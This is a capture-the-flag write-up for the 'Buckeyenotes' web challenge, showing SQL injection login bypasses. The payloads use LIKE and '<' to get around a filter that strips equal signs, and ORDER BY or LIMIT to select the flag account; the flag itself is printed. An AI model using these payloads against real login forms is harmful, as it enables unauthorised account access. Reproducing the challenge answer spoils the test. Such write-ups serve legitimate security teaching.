# Buckeyenotes

Open this URL: https://buckeyenotes.chall.pwnoh.io/

Test all special characters: `'"&<>` as username and password but we get `Invalid username or password`. In the first time i think it's XSS because we don't have a *HTTP error 500* and `HTTPOnly` is not defined. But we don't have other pages to send or store any data or payload.

So, i try SQL injection:

```
Username: test
Password: ' OR 1=1; --
```

We get this message: `nice try, hacker >:D I removed your equal signs`.

```
Username: rene
Password: ' OR 'abc' LIKE 'abc'; --
```

Success ! We get this message: `Logged in as rene. Nothing posted yet :(`, but we don't have the flag.

To get the flag i use this payload:

```
Username: test
Password: ' OR 'abc' LIKE 'abc' ORDER BY Username; --
```

We get this message: `Success! your flag is buckeye{wr1t3_ur_0wn_0p3n_2_pwn}`

This solution is working because the username is the first in alphabetical order (there are only 5 accounts and the username start with *b*).

There are other solutions to get the flag when the username is not the first in alphabetical order.

```
Username: test
Password: ' OR 'abc' LIKE 'abc' LIMIT 1, 2; --
```

You can change the numbers in the limit.

```
Username: test
Password: 1' OR 1<2 AND USERNAME like 'brutusB3stNut9999
```

This solution is very cool because there is only one request to find the flag.
